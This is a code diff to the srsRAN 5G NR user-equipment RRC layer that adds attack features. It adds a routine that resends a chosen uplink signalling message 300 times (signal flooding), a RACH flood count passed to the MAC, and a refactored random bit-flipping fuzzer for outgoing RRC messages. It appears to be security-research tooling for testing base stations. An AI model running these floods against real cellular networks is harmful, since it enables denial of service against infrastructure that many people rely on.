@@ -27,6 +27,8 @@
 #include "srsran/interfaces/ue_rlc_interfaces.h"
 #include "srsue/hdr/stack/rrc_nr/rrc_nr_procedures.h"
 #include "srsue/hdr/stack/upper/usim.h"
+#include "srsue/hdr/stack/mac_nr/mux_nr.h"
+#include "srsran/common/buffer_pool.h"
 
 
 #include <iostream>
@@ -38,6 +40,8 @@ using namespace srsran;
 namespace srsue {
 
 const static char* rrc_nr_state_text[] = {"IDLE", "CONNECTED", "CONNECTED-INACTIVE"};
+int rlc_pdu_len = 0;        
+int mac_buff_rem_space = 0;  
 
 rrc_nr::rrc_nr(srsran::task_sched_handle task_sched_) :
   logger(srslog::fetch_basic_logger("RRC-NR")),
@@ -134,6 +138,12 @@ void rrc_nr::stop()
 void rrc_nr::get_metrics(rrc_nr_metrics_t& m)
 {
   m.state = state;
+}
+
+void rrc_nr::get_RLC_metrics(mux_nr& RLC_mem)
+{
+  rlc_pdu_len = RLC_mem.get_RLC_PDU_len();
+  mac_buff_rem_space = RLC_mem.get_MAC_rem_buffer_space_len();
 }
 
 const char* rrc_nr::get_rb_name(uint32_t lcid)
@@ -660,23 +670,52 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
   uint32_t lcid = 0;
   log_rrc_message(get_rb_name(lcid), Tx, pdu.get(), msg, msg.msg.c1().type().to_string());
 
+  std::string msg_name = msg.msg.c1().type().to_string();
 
-  if (args.sdu_fuzzed_bits > 0 && (args.target_message == msg.msg.c1().type().to_string() || args.target_message == "")) {
-    std::cout << "Fuzzing message: " << std::endl
-                << "\tMessage Type: " << msg.msg.c1().type().to_string() << std::endl
-                << "\taddress: " << pdu.get()  << std::endl
-                << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
-                << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl;
-    for (uint32_t i = 0; i < args.sdu_fuzzed_bits; ++i) {
-          uint32_t byte_to_flip = std::rand() % pdu->N_bytes;
-          uint8_t bit_to_flip = std::rand() % 8;
-          pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
-    }
+  if (args.target_signal_attack == msg_name){
+    rlc->write_sdu(lcid, std::move(signal_flood_ccch(lcid, std::move(pdu), msg_name)));
+    return;
   }
 
+  if (args.sdu_fuzzed_bits > 0 && (args.target_message == msg_name || args.target_message == "")){
+    rlc->write_sdu(lcid, std::move(fuzz_ccch_msg(std::move(pdu), msg, msg_name)));
+    return;
+  }
 
   rlc->write_sdu(lcid, std::move(pdu));
 }
+
+srsran::unique_byte_buffer_t rrc_nr::signal_flood_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name){
+  for (uint16_t i = 0; i < 300; i++)
+  {
+    srsran::unique_byte_buffer_t new_buffer(pdu.get());
+    std::cout << "Singal flooding message: " << std::endl
+                << "\tMessage Type: " << msg_name << std::endl
+                << "\taddress: " << new_buffer.get()  << std::endl
+                << "\tMsg length(bytes): " << new_buffer->N_bytes << std::endl
+                << "\tRRC state: " << rrc_nr_state_text[state] << std::endl;
+    rlc->write_sdu(lcid, std::move(new_buffer));
+  }
+  return std::move(pdu);
+}
+
+srsran::unique_byte_buffer_t rrc_nr::fuzz_ccch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_ccch_msg_s msg, std::string msg_name){
+  std::cout << "Fuzzing message: " << std::endl
+              << "\tMessage Type: " << msg_name << std::endl
+              << "\taddress: " << pdu.get()  << std::endl
+              << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
+              << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl
+              << "RLC PDU size: "<< rlc_pdu_len<<std::endl
+              << "MAC Buffer remaining space: " << mac_buff_rem_space << std::endl;
+
+  for (uint32_t i = 0; i < args.sdu_fuzzed_bits; ++i) {
+        uint32_t byte_to_flip = std::rand() % pdu->N_bytes;
+        uint8_t bit_to_flip = std::rand() % 8;
+        pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
+  }
+  return std::move(pdu);
+}
+
 
 void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
 {
@@ -697,19 +736,34 @@ void rrc_nr::send_ul_dcch_msg(uint32_t lcid, const ul_dcch_msg_s& msg)
     log_rrc_message(get_rb_name(lcid), Tx, pdu.get(), msg, msg.msg.c1().type().to_string());
   }
 
-  if (args.sdu_fuzzed_bits > 0 && (args.target_message == msg.msg.c1().type().to_string() || args.target_message == "")) {
-    std::cout << "Fuzzing message: " << std::endl
-                << "\tMessage Type: " << msg.msg.c1().type().to_string() << std::endl
-                << "\taddress: " << pdu.get()  << std::endl
-                << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
-                << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl;
-    for (uint32_t i = 0; i < args.sdu_fuzzed_bits; ++i) {
-          uint32_t byte_to_flip = std::rand() % pdu->N_bytes;
-          uint8_t bit_to_flip = std::rand() % 8;
-          pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
-    }
+
+  std::string msg_name = msg.msg.c1().type().to_string();
+
+  if (args.target_signal_attack == msg_name){
+    pdcp->write_sdu(lcid, std::move(signal_flood_ccch(lcid, std::move(pdu), msg_name)));
+    return;
   }
+
+  if (args.sdu_fuzzed_bits > 0 && (args.target_message == msg_name || args.target_message == "")){
+    pdcp->write_sdu(lcid, std::move(fuzz_dcch_msg(std::move(pdu), msg, msg_name)));
+    return;
+  }
+
   pdcp->write_sdu(lcid, std::move(pdu));
+}
+
+srsran::unique_byte_buffer_t rrc_nr::fuzz_dcch_msg(srsran::unique_byte_buffer_t pdu, const asn1::rrc_nr::ul_dcch_msg_s msg, std::string msg_name){
+  std::cout << "Fuzzing message: " << std::endl
+              << "\tMessage Type: " << msg_name << std::endl
+              << "\taddress: " << pdu.get()  << std::endl
+              << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
+              << "\tfuzzing bits: " << args.sdu_fuzzed_bits << std::endl;
+  for (uint32_t i = 0; i < args.sdu_fuzzed_bits; ++i) {
+        uint32_t byte_to_flip = std::rand() % pdu->N_bytes;
+        uint8_t bit_to_flip = std::rand() % 8;
+        pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
+  }
+  return std::move(pdu);
 }
 
 void rrc_nr::send_con_setup_complete(srsran::unique_byte_buffer_t nas_msg)
@@ -1546,6 +1600,7 @@ bool rrc_nr::apply_ul_common_cfg(const asn1::rrc_nr::ul_cfg_common_s& ul_cfg_com
       if (ul_cfg_common.init_ul_bwp.rach_cfg_common.type() == setup_release_c<rach_cfg_common_s>::types_opts::setup) {
         rach_cfg_nr_t rach_cfg_nr = {};
         make_mac_rach_cfg(ul_cfg_common.init_ul_bwp.rach_cfg_common.setup(), &rach_cfg_nr);
+        rach_cfg_nr.rach_flood_count = args.rach_flood_count;
         mac->set_config(rach_cfg_nr);
 
         // Make the RACH configuration for PHY
